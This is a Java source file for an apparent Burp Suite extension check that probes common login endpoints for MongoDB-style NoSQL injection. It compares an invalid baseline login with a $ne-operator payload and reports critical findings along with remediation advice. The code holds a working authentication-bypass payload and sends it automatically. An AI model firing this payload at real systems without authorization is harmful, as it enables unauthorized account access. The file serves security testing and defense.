package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Pattern;

/**
 * Testa bypass de autenticação via operadores de NoSQL (estilo MongoDB,
 * ex: $ne, $gt) em endpoints de login: compara a resposta de um login
 * claramente inválido (baseline) com a resposta usando operadores de
 * injeção — se o comportamento mudar de "negado" para "sucesso", é um
 * forte indício de NoSQL Injection.
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class NoSqlInjectionCheck implements VulnCheck {

    private static final String[] PATHS = {"/api/login", "/api/v1/login", "/api/auth/login", "/login"};

    private static final String USUARIO_INEXISTENTE = "rx0_usuario_que_nao_existe_" + System.currentTimeMillis();

    private static final Pattern[] ASSINATURAS_SUCESSO = {
            Pattern.compile("\"(token|access_token|jwt|session)\"\\s*:\\s*\"[^\"]{10,}", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\"success\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\"authenticated\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
            Pattern.compile("\"(loggedIn|logged_in)\"\\s*:\\s*true", Pattern.CASE_INSENSITIVE),
    };

    @Override
    public String nome() {
        return "NoSQL Injection (bypass de autenticação estilo MongoDB)";
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        List<Finding> achados = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        for (String path : PATHS) {
            try {
                String url = base + path;

                // 1) Baseline: login claramente inválido com valores normais de string
                String corpoBaseline = "{\"username\":\"" + USUARIO_INEXISTENTE + "\",\"password\":\"senha_errada_123\"}";
                HttpRequest reqBaseline = HttpRequest.httpRequestFromUrl(url)
                        .withMethod("POST")
                        .withAddedHeader("Content-Type", "application/json")
                        .withBody(corpoBaseline);
                HttpResponse respBaseline = api.http().sendRequest(reqBaseline).response();
                if (respBaseline == null) continue;
                boolean baselineParecesucesso = corpoIndicaSucesso(respBaseline.bodyToString());
                if (baselineParecesucesso) continue; // esse endpoint sempre "sucede", sinal ruidoso — pula

                // 2) Payload de injeção: operadores $ne fazem a query aceitar "qualquer valor diferente de null"
                String corpoInjetado = "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}";
                HttpRequest reqInjetado = HttpRequest.httpRequestFromUrl(url)
                        .withMethod("POST")
                        .withAddedHeader("Content-Type", "application/json")
                        .withBody(corpoInjetado);
                HttpResponse respInjetado = api.http().sendRequest(reqInjetado).response();
                if (respInjetado == null) continue;

                boolean injetadoParecesucesso = corpoIndicaSucesso(respInjetado.bodyToString())
                        || (respInjetado.statusCode() == 200 && respBaseline.statusCode() != 200);

                if (injetadoParecesucesso) {
                    achados.add(new Finding(
                            "Possível NoSQL Injection (bypass de login) em " + path,
                            Severity.CRITICA,
                            url,
                            "Um login com credenciais claramente inválidas foi rejeitado (status " + respBaseline.statusCode() +
                                    "), mas o mesmo endpoint com operadores de NoSQL ($ne) no lugar dos valores retornou indícios de " +
                                    "autenticação bem-sucedida (status " + respInjetado.statusCode() + "). Isso sugere que a query ao banco " +
                                    "NoSQL está sendo montada diretamente a partir do JSON do usuário, sem sanitização.",
                            "Baseline: " + corpoBaseline + " -> " + respBaseline.statusCode() +
                                    " | Payload: " + corpoInjetado + " -> " + respInjetado.statusCode(),
                            "Nunca repasse o JSON do usuário diretamente para a query do banco. Valide o tipo de cada campo " +
                                    "(rejeite objetos onde se espera string) e use bibliotecas de sanitização específicas para NoSQL (ex: mongo-sanitize)."));
                }
            } catch (Exception e) {
                api.logging().logToError("[Rx0] Erro no check de NoSQL Injection (" + path + "): " + e.getMessage());
            }
        }
        return achados;
    }

    private boolean corpoIndicaSucesso(String body) {
        if (body == null) return false;
        for (Pattern p : ASSINATURAS_SUCESSO) {
            if (p.matcher(body).find()) return true;
        }
        return false;
    }
}
